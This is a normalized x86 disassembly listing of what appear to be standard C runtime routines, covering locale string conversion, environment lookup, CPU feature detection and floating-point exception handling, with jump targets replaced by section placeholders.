je r-xdata
mov eax ebx
jmp r-xdata
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebp - 0xc ] 0x0
je r-xdata
movzx ecx [ ebp - 0x7 ]
shl eax 0x8
or eax ecx
mov eax [ ebp - 0x18 ]
push 0x1
push [ eax + 0x4 ]
lea edx [ ebp - 0x8 ]
push 0x3
push edx
push ecx
lea ecx [ ebp - 0x4 ]
push ecx
push 0x200
push [ eax + 0x14 ]
lea eax [ ebp - 0x18 ]
push eax
call sub_44d8fe
add esp 0x24
test eax eax
je r-xdata
pop ebx
leave
retn
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_451d20
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_451c0a
pop ecx
pop ecx
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x61 ]
cmp ecx 0x19
ja r-xdata
pop ebp
retn
add eax 0xffffffe0
pop ebp
retn
sub_451d4c
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_441455
mov eax [ ebp + 0x18 ]
test eax eax
jle r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push eax
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call [ LCMapStringW@IAT ]
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov ecx [ ebp + 0x14 ]
mov edx eax
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub eax edx
dec eax
inc ecx
inc ecx
test edx edx
jne r-xdata
dec edx
cmp [ ecx ] 0x0
je r-xdata
or edx 0xffffffff
sub_451da3
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
xor ebx ebx
push edi
cmp [ ebp + 0x14 ] ebx
jne r-xdata
cmp esi ebx
je r-xdata
cmp esi ebx
jne r-xdata
call sub_443b37
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
cmp edi ebx
ja r-xdata
cmp [ ebp + 0xc ] ebx
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
cmp [ ebp + 0x14 ] ebx
jne r-xdata
xor eax eax
mov edx [ ebp + 0x10 ]
cmp edx ebx
jne r-xdata
mov [ esi ] bl
jmp r-xdata
cmp [ ebp + 0x14 ] 0xffffffff
mov eax esi
jne r-xdata
mov [ esi ] bl
jmp r-xdata
mov cl [ edx ]
mov [ eax ] cl
inc eax
inc edx
cmp cl bl
je r-xdata
mov cl [ edx ]
mov [ eax ] cl
inc eax
inc edx
cmp cl bl
je r-xdata
cmp [ ebp + 0x14 ] ebx
jne r-xdata
dec edi
je r-xdata
cmp edi ebx
jne r-xdata
dec edi
jne r-xdata
mov [ eax ] bl
dec [ ebp + 0x14 ]
jne r-xdata
cmp [ ebp + 0x14 ] 0xffffffff
jne r-xdata
jmp r-xdata
mov [ esi ] bl
call sub_443b37
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
mov eax [ ebp + 0xc ]
push 0x50
mov [ esi + eax - 0x1 ] bl
pop eax
jmp r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_440791
add esp 0x14
mov eax esi
jmp r-xdata
sub_451e58
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
push esi
mov esi [ rw-data ]
jne r-xdata
push edi
test esi esi
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
cmp [ rw-data ] esi
je r-xdata
pop esi
pop ebp
retn
xor eax eax
push [ ebp + 0x8 ]
call sub_442e20
pop ecx
mov edi eax
jmp r-xdata
call sub_454c19
test eax eax
jne r-xdata
mov eax [ esi ]
test eax eax
jne r-xdata
mov esi [ rw-data ]
test esi esi
je r-xdata
push eax
call sub_442e20
pop ecx
cmp eax edi
jbe r-xdata
add esi 0x4
mov eax [ esi ]
cmp [ eax + edi ] 0x3d
jne r-xdata
push edi
push [ ebp + 0x8 ]
push eax
call sub_454bff
add esp 0xc
test eax eax
je r-xdata
mov eax [ esi ]
lea eax [ eax + edi + 0x1 ]
jmp r-xdata
pop edi
sub_451f58
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
xor eax eax
push ebx
mov [ ebp - 0x4 ] eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] eax
push ebx
pushfd
pop eax
mov ecx eax
xor eax 0x200000
push eax
popfd
pushfd
pop edx
sub edx ecx
je r-xdata
pop ebx
test [ ebp - 0x4 ] 0x4000000
je r-xdata
push ecx
popfd
xor eax eax
cpuid
mov [ ebp - 0xc ] eax
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] edx
mov [ ebp - 0x10 ] ecx
mov eax 0x1
cpuid
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
call sub_451f08
test eax eax
je r-xdata
xor eax eax
inc eax
jmp r-xdata
pop ebx
leave
retn
sub_451fc7
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov cl [ ebp + 0x10 ]
push ebx
push esi
push edi
xor edi edi
mov [ eax + 0x4 ] edi
mov eax [ ebp + 0x8 ]
xor ebx ebx
mov [ eax + 0x8 ] edi
mov eax [ ebp + 0x8 ]
inc ebx
mov [ eax + 0xc ] edi
test cl 0x10
je r-xdata
test cl 0x2
je r-xdata
mov eax [ ebp + 0x8 ]
or [ eax + 0x4 ] ebx
mov [ ebp + 0x10 ] 0xc000008f
test bl cl
je r-xdata
mov eax [ ebp + 0x8 ]
or [ eax + 0x4 ] 0x2
mov [ ebp + 0x10 ] 0xc0000093
test cl 0x4
je r-xdata
mov eax [ ebp + 0x8 ]
or [ eax + 0x4 ] 0x4
mov [ ebp + 0x10 ] 0xc0000091
test cl 0x8
je r-xdata
mov eax [ ebp + 0x8 ]
or [ eax + 0x4 ] 0x8
mov [ ebp + 0x10 ] 0xc000008e
mov esi [ ebp + 0xc ]
mov ecx [ esi ]
mov eax [ ebp + 0x8 ]
shl ecx 0x4
not ecx
xor ecx [ eax + 0x8 ]
and ecx 0x10
xor [ eax + 0x8 ] ecx
mov ecx [ esi ]
mov eax [ ebp + 0x8 ]
add ecx ecx
not ecx
xor ecx [ eax + 0x8 ]
and ecx 0x8
xor [ eax + 0x8 ] ecx
mov ecx [ esi ]
mov eax [ ebp + 0x8 ]
shr ecx 0x1
not ecx
xor ecx [ eax + 0x8 ]
and ecx 0x4
xor [ eax + 0x8 ] ecx
mov ecx [ esi ]
mov eax [ ebp + 0x8 ]
shr ecx 0x3
not ecx
xor ecx [ eax + 0x8 ]
and ecx 0x2
xor [ eax + 0x8 ] ecx
mov ecx [ esi ]
mov eax [ ebp + 0x8 ]
shr ecx 0x5
not ecx
xor ecx [ eax + 0x8 ]
and ecx ebx
xor [ eax + 0x8 ] ecx
call sub_452820
test bl al
je r-xdata
mov eax [ ebp + 0x8 ]
or [ eax + 0x4 ] 0x10
mov [ ebp + 0x10 ] 0xc0000090
test al 0x4
je r-xdata
mov ecx [ ebp + 0x8 ]
or [ ecx + 0xc ] 0x10
test al 0x8
je r-xdata
mov ecx [ ebp + 0x8 ]
or [ ecx + 0xc ] 0x8
test al 0x10
je r-xdata
mov ecx [ ebp + 0x8 ]
or [ ecx + 0xc ] 0x4
test al 0x20
je r-xdata
mov ecx [ ebp + 0x8 ]
or [ ecx + 0xc ] 0x2
mov eax [ esi ]
mov ecx 0xc00
and eax ecx
je r-xdata
mov eax [ ebp + 0x8 ]
or [ eax + 0xc ] ebx
mov eax [ ebp + 0x8 ]
and [ eax ] 0xfffffffc
cmp eax 0x400
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
and ecx 0xffffffeb
or ecx 0x8
cmp eax 0x200
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
and ecx 0xfffffffd
or ecx ebx
jmp r-xdata
cmp eax 0x800
je r-xdata
mov ecx [ eax + 0x20 ]
and ecx 0xffffffe3
or ecx 0x2
mov [ eax + 0x20 ] ecx
mov eax [ ebp + 0x18 ]
fld [ eax ]
mov eax [ ebp + 0x8 ]
fstp [ eax + 0x10 ]
mov eax [ ebp + 0x8 ]
or [ eax + 0x60 ] ebx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x60 ]
and ecx 0xffffffe3
or ecx 0x2
mov [ eax + 0x60 ] ecx
fld [ edi ]
mov eax [ ebp + 0x8 ]
fstp [ eax + 0x50 ]
and [ eax + 0x20 ] 0xffffffe1
mov eax [ ebp + 0x18 ]
fld [ eax ]
mov eax [ ebp + 0x8 ]
fstp [ eax + 0x10 ]
mov eax [ ebp + 0x8 ]
or [ eax + 0x60 ] ebx
mov eax [ ebp + 0x8 ]
and [ eax + 0x60 ] 0xffffffe1
fld [ edi ]
mov eax [ ebp + 0x8 ]
fstp [ eax + 0x50 ]
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
and ecx 0xffffffe7
or ecx 0x4
jmp r-xdata
cmp eax ecx
jne r-xdata
mov [ eax ] ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
and ecx 0xfffffffe
or ecx 0x2
cmp eax ecx
jne r-xdata
test [ ecx + 0x8 ] 0x8
je r-xdata
and [ esi ] 0xfffffffe
call sub_452830
lea eax [ ebp + 0x8 ]
push eax
push ebx
push 0x0
push [ ebp + 0x10 ]
call [ RaiseException@IAT ]
mov ecx [ ebp + 0x8 ]
test [ ecx + 0x8 ] 0x10
je r-xdata
mov [ eax ] ecx
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0x14 ]
shl ecx 0x5
xor ecx [ eax ]
and ecx 0x1ffe0
xor [ eax ] ecx
mov eax [ ebp + 0x8 ]
or [ eax + 0x20 ] ebx
cmp [ ebp + 0x20 ] edi
mov eax [ ebp + 0x8 ]
mov edi [ ebp + 0x1c ]
je r-xdata
mov eax [ ebp + 0x8 ]
and [ eax ] 0xffffffe3
jmp r-xdata
mov eax [ esi ]
mov ecx 0x300
and eax ecx
je r-xdata
mov eax [ ebp + 0x8 ]
or [ eax ] 0x3
jmp r-xdata
test [ ecx + 0x8 ] 0x4
je r-xdata
and [ esi ] 0xfffffffb
test [ ecx + 0x8 ] 0x2
je r-xdata
and [ esi ] 0xfffffff7
test [ ecx + 0x8 ] bl
je r-xdata
and [ esi ] 0xffffffef
mov eax [ ecx ]
and eax 0x3
xor ebx ebx
sub eax ebx
mov edx 0xfffff3ff
je r-xdata
and [ esi ] 0xffffffdf
and [ esi ] edx
dec eax
je r-xdata
mov eax [ esi ]
and eax edx
or eax 0x300
dec eax
je r-xdata
mov eax [ esi ]
and eax 0xfffff7ff
or eax 0x400
jmp r-xdata
dec eax
je r-xdata
fld [ ecx + 0x50 ]
fstp [ edi ]
fld [ ecx + 0x50 ]
fstp [ edi ]
jmp r-xdata
mov eax [ esi ]
and eax edx
or eax 0x200
jmp r-xdata
dec eax
jne r-xdata
mov [ esi ] eax
jmp r-xdata
mov eax [ esi ]
and eax 0xfffffbff
or eax 0x800
dec eax
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov [ esi ] eax
cmp [ ebp + 0x20 ] ebx
je r-xdata
and [ esi ] edx
jmp r-xdata
mov eax [ ecx ]
shr eax 0x2
and eax 0x7
sub eax ebx
je r-xdata
or [ esi ] 0xc00
jmp r-xdata
sub_4522a3
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_451fc7
add esp 0x1c
pop ebp
retn
sub_4522c6
mov edi edi
push ebp
mov ebp esp
sub esp 0x14
mov eax [ ebp + 0x8 ]
push ebx
push esi
xor ebx ebx
mov esi eax
and esi 0x1f
inc ebx
mov [ ebp - 0x4 ] esi
test al 0x8
je r-xdata
test al 0x4
je r-xdata
test [ ebp + 0x10 ] bl
je r-xdata
test bl al
je r-xdata
test [ ebp + 0x10 ] 0x4
je r-xdata
push ebx
call sub_45286a
pop ecx
and esi 0xfffffff7
jmp r-xdata
test al 0x2
je r-xdata
test [ ebp + 0x10 ] 0x8
je r-xdata
push 0x4
call sub_45286a
pop ecx
and esi 0xfffffffb
jmp r-xdata
test [ ebp + 0x8 ] 0x10
je r-xdata
test [ ebp + 0x10 ] 0x10
je r-xdata
push 0x8
call sub_45286a
mov eax [ ebp + 0x10 ]
pop ecx
mov ecx 0xc00
and eax ecx
je r-xdata
xor eax eax
test esi esi
pop esi
sete al
pop ebx
leave
retn
test [ ebp + 0x10 ] 0x20
je r-xdata
xor esi esi
test al 0x10
je r-xdata
fldz
mov ecx [ ebp + 0xc ]
fcomp [ ecx ]
fnstsw ax
test ah 0x5
jpe r-xdata
cmp eax 0x400
je r-xdata
push 0x20
call sub_45286a
pop ecx
and esi 0xffffffef
fldz
push edi
mov edi [ ebp + 0xc ]
fcomp [ edi ]
fnstsw ax
test ah 0x44
jpo r-xdata
mov esi ebx
fld [ rw-data ]
fld [ rw-data ]
jmp r-xdata
fldz
mov ecx [ ebp + 0xc ]
fcomp [ ecx ]
fnstsw ax
test ah 0x5
jpe r-xdata
cmp eax 0x800
je r-xdata
mov esi ebx
fld [ edi ]
lea eax [ ebp - 0x8 ]
push eax
push ecx
push ecx
fstp [ esp ]
call sub_452767
mov ecx [ ebp - 0x8 ]
fstp [ ebp - 0x14 ]
add ecx 0xfffffa00
add esp 0xc
cmp ecx 0xfffffbce
jge r-xdata
fstp [ ecx ]
fld [ rw-data ]
jmp r-xdata
fldz
mov ecx [ ebp + 0xc ]
fcomp [ ecx ]
fnstsw ax
test ah 0x5
jpo r-xdata
cmp eax ecx
jne r-xdata
and [ ebp - 0x4 ] 0xfffffffd
mov esi [ ebp - 0x4 ]
push 0x10
call sub_45286a
pop ecx
fldz
fcomp [ ebp - 0x14 ]
fnstsw ax
test ah 0x41
jne r-xdata
fld [ ebp - 0x14 ]
mov esi ebx
fmul [ r--data ]
jmp r-xdata
fld [ rw-data ]
jmp r-xdata
and esi 0xfffffffe
jmp r-xdata
fldz
mov ecx [ ebp + 0xc ]
fcomp [ ecx ]
fnstsw ax
fld [ rw-data ]
test ah 0x5
jpo r-xdata
xor edx edx
mov edx ebx
jmp r-xdata
fstp [ ebp - 0x14 ]
fchs
jmp r-xdata
test edx edx
je r-xdata
sub eax ecx
mov eax [ ebp - 0xe ]
and eax 0xf
or eax 0x10
mov [ ebp - 0xe ] ax
mov eax 0xfffffc03
cmp ecx eax
jge r-xdata
pop edi
test esi esi
je r-xdata
fld [ ebp - 0x14 ]
fstp [ edi ]
jmp r-xdata
fld [ ebp - 0x14 ]
fchs
shr [ ebp - 0x14 ] 0x1
test [ ebp - 0x10 ] bl
je r-xdata
test esi esi
jne r-xdata
shr [ ebp - 0x10 ] 0x1
dec eax
jne r-xdata
or [ ebp - 0x14 ] 0x80000000
mov esi ebx
test [ ebp - 0x14 ] bl
je r-xdata
sub_4524a8
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x1
je r-xdata
call sub_443b37
mov [ eax ] 0x21
jle r-xdata
pop ebp
retn
cmp [ ebp + 0x8 ] 0x3
jg r-xdata
call sub_443b37
mov [ eax ] 0x22
pop ebp
retn
sub_4524d5
mov edi edi
push ebp
mov ebp esp
mov al [ ebp + 0x8 ]
test al 0x20
je r-xdata
test al 0x8
je r-xdata
push 0x5
jmp r-xdata
test al 0x4
je r-xdata
xor eax eax
inc eax
pop ebp
retn
pop eax
pop ebp
retn
test al 0x1
je r-xdata
push 0x2
jmp r-xdata
movzx eax al
and eax 0x2
add eax eax
pop ebp
retn
push 0x3
sub_452509
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
xor eax eax
mov eax [ eax * 8 + rw-data ]
jmp r-xdata
inc eax
cmp eax 0x1d
jl r-xdata
mov [ ebp - 0x1c ] eax
test eax eax
je r-xdata
mov ecx [ eax * 8 + rw-data ]
cmp ecx [ ebp + 0xc ]
je r-xdata
xor eax eax
push 0xffff
push [ ebp + 0x28 ]
call sub_452841
push [ ebp + 0x8 ]
call sub_4524a8
fld [ ebp + 0x20 ]
add esp 0xc
leave
retn
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp + 0x14 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0x1c ]
push esi
mov esi [ ebp + 0x8 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x20 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x24 ]
push 0xffff
push [ ebp + 0x28 ]
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x4 ] eax
call sub_452841
lea eax [ ebp - 0x20 ]
push eax
call sub_451f05
add esp 0xc
test eax eax
jne r-xdata
fld [ ebp - 0x8 ]
pop esi
leave
retn
push esi
call sub_4524a8
pop ecx
sub_4525a9
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
call sub_443b37
push 0xffff
push [ ebp + 0x14 ]
mov [ eax ] 0x21
call sub_452841
fld [ ebp + 0xc ]
pop ecx
pop ecx
pop ebp
retn
push [ ebp + 0x14 ]
fld [ ebp + 0xc ]
sub esp 0x18
fstp [ esp + 0x10 ]
fldz
fstp [ esp + 0x8 ]
fld [ ebp + 0xc ]
fstp [ esp ]
push [ ebp + 0x8 ]
push 0x1
call sub_452509
add esp 0x24
pop ebp
retn
sub_4525fe
mov edi edi
push ebx
mov ebx esp
push ecx
push ecx
and esp 0xfffffff0
add esp 0x4
push ebp
mov ebp [ ebx + 0x4 ]
mov [ esp + 0x4 ] ebp
mov ebp esp
sub esp 0x80
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push [ ebx + 0x20 ]
lea eax [ ebx + 0x18 ]
push eax
push [ ebx + 0x8 ]
call sub_4522c6
add esp 0xc
test eax eax
jne r-xdata
push [ ebx + 0x8 ]
call sub_4524d5
add esp 0x4
cmp [ rw-data ] 0x0
jne r-xdata
and [ ebp - 0x40 ] 0xfffffffe
lea eax [ ebx + 0x18 ]
push eax
lea eax [ ebx + 0x10 ]
push eax
push [ ebx + 0xc ]
lea eax [ ebx + 0x20 ]
push [ ebx + 0x8 ]
push eax
lea eax [ ebp - 0x80 ]
push eax
call sub_4522a3
add esp 0x18
push eax
call sub_4524a8
mov [ esp ] 0xffff
push [ ebx + 0x20 ]
call sub_452841
fld [ ebx + 0x18 ]
pop ecx
pop ecx
test eax eax
je r-xdata
push [ ebx + 0x20 ]
fld [ ebx + 0x18 ]
sub esp 0x18
fstp [ esp + 0x10 ]
fldz
fstp [ esp + 0x8 ]
fld [ ebx + 0x10 ]
fstp [ esp ]
push [ ebx + 0xc ]
push eax
call sub_452509
add esp 0x24
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_43f96b
mov esp ebp
pop ebp
mov esp ebx
pop ebx
retn
sub_4526db
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ ebp + 0x10 ]
fld [ ebp + 0x8 ]
mov ecx [ ebp + 0xe ]
fstp [ ebp - 0x8 ]
add eax 0x3fe
shl eax 0x4
and ecx 0x800f
or eax ecx
mov [ ebp - 0x2 ] ax
fld [ ebp - 0x8 ]
leave
retn
sub_452707
mov edi edi
push ebp
mov ebp esp
xor edx edx
cmp [ ebp + 0xc ] 0x7ff00000
jne r-xdata
cmp [ ebp + 0xc ] 0xfff00000
jne r-xdata
cmp [ ebp + 0x8 ] edx
jne r-xdata
mov ecx [ ebp + 0xe ]
mov eax 0x7ff8
and ecx eax
cmp cx ax
jne r-xdata
cmp [ ebp + 0x8 ] edx
jne r-xdata
xor eax eax
inc eax
pop ebp
retn
mov eax 0x7ff0
cmp cx ax
jne r-xdata
push 0x3
jmp r-xdata
push 0x2
xor eax eax
pop ebp
retn
test [ ebp + 0xc ] 0x7ffff
jne r-xdata
pop eax
pop ebp
retn
push 0x4
jmp r-xdata
cmp [ ebp + 0x8 ] edx
je r-xdata
sub_452767
mov edi edi
push ebp
mov ebp esp
fldz
fcom [ ebp + 0x8 ]
fnstsw ax
test ah 0x44
jpe r-xdata
mov edx [ ebp + 0xe ]
xor ecx ecx
test edx 0x7ff0
jne r-xdata
xor edx edx
jmp r-xdata
push ecx
fstp st0
fld [ ebp + 0x8 ]
push ecx
push ecx
fstp [ esp ]
call sub_4526db
shr edx 0x4
and edx 0x7ff
add esp 0xc
sub edx 0x3fe
test [ ebp + 0xc ] 0xfffff
jne r-xdata
mov eax [ ebp + 0x10 ]
mov [ eax ] edx
pop ebp
retn
fcomp [ ebp + 0x8 ]
mov edx 0xfffffc03
fnstsw ax
test ah 0x41
jne r-xdata
cmp [ ebp + 0x8 ] ecx
je r-xdata
xor eax eax
jmp r-xdata
xor eax eax
inc eax
jmp r-xdata
test [ ebp + 0xe ] 0x10
je r-xdata
shl [ ebp + 0xc ] 0x1
test [ ebp + 0x8 ] 0x80000000
je r-xdata
push esi
mov esi 0xffef
and [ ebp + 0xe ] si
pop esi
cmp eax ecx
je r-xdata
shl [ ebp + 0x8 ] 0x1
dec edx
or [ ebp + 0xc ] 0x1
fld [ ebp + 0x8 ]
push ecx
push ecx
push ecx
fstp [ esp ]
call sub_4526db
add esp 0xc
jmp r-xdata
mov eax 0x8000
or [ ebp + 0xe ] ax
sub_452841
mov edi edi
push ebp
mov ebp esp
push ecx
fwait
fnstcw [ ebp - 0x4 ]
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
and ecx [ ebp + 0xc ]
not eax
and eax [ ebp - 0x4 ]
or eax ecx
movzx eax ax
mov [ ebp + 0xc ] eax
fldcw [ ebp + 0xc ]
movsx eax [ ebp - 0x4 ]
leave
retn
sub_45286a
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov cl [ ebp + 0x8 ]
test cl 0x1
je r-xdata
test cl 0x8
je r-xdata
fld [ rw-data ]
fistp [ ebp + 0x8 ]
fwait
test cl 0x10
je r-xdata
fwait
fnstsw ax
fld [ rw-data ]
fstp [ ebp - 0x8 ]
fwait
fwait
fnstsw ax
test cl 0x4
je r-xdata
fld [ rw-data ]
fstp [ ebp - 0x8 ]
fwait
test cl 0x20
je r-xdata
fldz
fld1
fdivrp st1
fstp st0
fwait
leave
retn
fldpi
fstp [ ebp - 0x8 ]
fwait
sub_4528c2
push 0x8
push r--data
call sub_4433dc
xor eax eax
cmp [ rw-data ] eax
je r-xdata
call sub_443421
retn
test [ ebp + 0x8 ] 0x40
je r-xdata
and [ ebp + 0x8 ] 0xffffffbf
ldmxcsr [ ebp + 0x8 ]
cmp [ rw-data ] eax
je r-xdata
mov [ ebp - 0x4 ] eax
ldmxcsr [ ebp + 0x8 ]
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
jmp r-xdata
sub_452934
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
push ebx
push esi
xor ebx ebx
push edi
mov edi ecx
cmp eax ebx
jne r-xdata
cmp eax 0x2
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
xor esi esi
inc esi
push esi
push r--data
push esi
call [ GetStringTypeW@IAT ]
test eax eax
je r-xdata
xor esi esi
cmp [ ebp + 0x1c ] ebx
jne r-xdata
cmp eax ebx
je r-xdata
call [ GetLastError@IAT ]
cmp eax 0x78
jne r-xdata
mov [ rw-data ] esi
jmp r-xdata
cmp [ ebp + 0x18 ] ebx
jne r-xdata
mov eax [ edi ]
mov eax [ eax + 0x14 ]
mov [ ebp + 0x1c ] eax
cmp eax 0x1
jne r-xdata
mov eax [ rw-data ]
push 0x2
pop eax
mov [ rw-data ] eax
jmp r-xdata
mov [ ebp - 0x8 ] ebx
cmp [ ebp + 0x18 ] ebx
jne r-xdata
push [ ebp + 0x1c ]
call sub_453e71
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov eax [ edi ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x18 ] eax
xor eax eax
jmp r-xdata
mov esi [ MultiByteToWideChar@IAT ]
xor eax eax
cmp [ ebp + 0x20 ] ebx
push ebx
push ebx
push [ ebp + 0x10 ]
setne al
push [ ebp + 0xc ]
lea eax [ eax * 8 + 0x1 ]
push eax
push [ ebp + 0x18 ]
call esi
mov edi eax
cmp edi ebx
je r-xdata
mov eax [ edi ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x18 ] eax
cmp eax [ ebp + 0x18 ]
je r-xdata
lea esp [ ebp - 0x14 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_43f96b
leave
retn
jle r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ebp + 0x1c ]
call [ GetStringTypeA@IAT ]
mov edi eax
cmp esi ebx
je r-xdata
push ebx
push ebx
lea ecx [ ebp + 0x10 ]
push ecx
push [ ebp + 0xc ]
push eax
push [ ebp + 0x18 ]
call sub_453eba
mov esi eax
add esp 0x18
cmp esi ebx
je r-xdata
test ebx ebx
je r-xdata
cmp edi 0x7ffffff0
ja r-xdata
mov eax edi
push esi
call sub_44120e
pop ecx
mov [ ebp + 0xc ] esi
lea eax [ edi + edi ]
push eax
push 0x0
push ebx
call sub_443360
add esp 0xc
push edi
push ebx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push 0x1
push [ ebp + 0x18 ]
call esi
test eax eax
je r-xdata
lea eax [ edi + edi + 0x8 ]
cmp eax 0x400
ja r-xdata
push ebx
call sub_413960
mov eax [ ebp - 0x8 ]
pop ecx
jmp r-xdata
push [ ebp + 0x14 ]
push eax
push ebx
push [ ebp + 0x8 ]
call [ GetStringTypeW@IAT ]
mov [ ebp - 0x8 ] eax
push eax
call sub_441c3d
pop ecx
cmp eax ebx
je r-xdata
call sub_443650
mov eax esp
cmp eax ebx
je r-xdata
mov ebx eax
mov [ eax ] 0xdddd
mov [ eax ] 0xcccc
jmp r-xdata
add eax 0x8
sub_452aee
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_441455
push [ ebp + 0x24 ]
lea ecx [ ebp - 0x10 ]
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_452934
add esp 0x1c
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_452b30
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
push [ esi + 0x4 ]
call sub_44120e
push [ esi + 0x8 ]
call sub_44120e
push [ esi + 0xc ]
call sub_44120e
push [ esi + 0x10 ]
call sub_44120e
push [ esi + 0x14 ]
call sub_44120e
push [ esi + 0x18 ]
call sub_44120e
push [ esi ]
call sub_44120e
push [ esi + 0x20 ]
call sub_44120e
push [ esi + 0x24 ]
call sub_44120e
push [ esi + 0x28 ]
call sub_44120e
push [ esi + 0x2c ]
call sub_44120e
push [ esi + 0x30 ]
call sub_44120e
push [ esi + 0x34 ]
call sub_44120e
push [ esi + 0x1c ]
call sub_44120e
push [ esi + 0x38 ]
call sub_44120e
push [ esi + 0x3c ]
call sub_44120e
add esp 0x40
push [ esi + 0x40 ]
call sub_44120e
push [ esi + 0x44 ]
call sub_44120e
push [ esi + 0x48 ]
call sub_44120e
push [ esi + 0x4c ]
call sub_44120e
push [ esi + 0x50 ]
call sub_44120e
push [ esi + 0x54 ]
call sub_44120e
push [ esi + 0x58 ]
call sub_44120e
push [ esi + 0x5c ]
call sub_44120e
push [ esi + 0x60 ]
call sub_44120e
push [ esi + 0x64 ]
call sub_44120e
push [ esi + 0x68 ]
call sub_44120e
push [ esi + 0x6c ]
call sub_44120e
push [ esi + 0x70 ]
call sub_44120e
push [ esi + 0x74 ]
call sub_44120e
push [ esi + 0x78 ]
call sub_44120e
push [ esi + 0x7c ]
call sub_44120e
add esp 0x40
push [ esi + 0x80 ]
call sub_44120e
push [ esi + 0x84 ]
call sub_44120e
push [ esi + 0x88 ]
call sub_44120e
push [ esi + 0x8c ]
call sub_44120e
push [ esi + 0x90 ]
call sub_44120e
push [ esi + 0x94 ]
call sub_44120e
push [ esi + 0x98 ]
call sub_44120e
push [ esi + 0x9c ]
call sub_44120e
push [ esi + 0xa0 ]
call sub_44120e
push [ esi + 0xa4 ]
call sub_44120e
push [ esi + 0xa8 ]
call sub_44120e
add esp 0x2c
sub_452cc5
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
mov eax [ esi ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ esi + 0x4 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_44120e
pop ecx
mov esi [ esi + 0x8 ]
cmp esi [ rw-data ]
je r-xdata
push eax
call sub_44120e
pop ecx
push esi
call sub_44120e
pop ecx
sub_452d0a
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
